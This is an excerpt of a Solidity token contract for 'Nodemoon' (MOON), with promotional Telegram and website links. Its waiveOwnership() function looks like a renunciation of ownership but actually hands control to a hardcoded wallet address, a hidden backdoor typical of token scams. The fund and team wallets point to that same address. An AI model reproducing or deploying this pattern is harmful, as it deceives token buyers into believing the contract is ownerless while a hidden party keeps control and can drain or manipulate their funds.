...
/**
Telegram : https://t.me/officialnodemoon
Website : https://nodemoon.tech
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xE4640b630b118CD5A444eD59181A4AD39136aFAf);
    }
...
contract Nodemoon is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Nodemoon";
    string private _symbol = "MOON";
    uint8 private _decimals = 9;

    address payable public fundWalletAddress = payable(0x926b8BA1B8A0679f7aD5964D9CA97CFec3e5E417);
    address payable public teamWalletAddress = payable(0x926b8BA1B8A0679f7aD5964D9CA97CFec3e5E417);
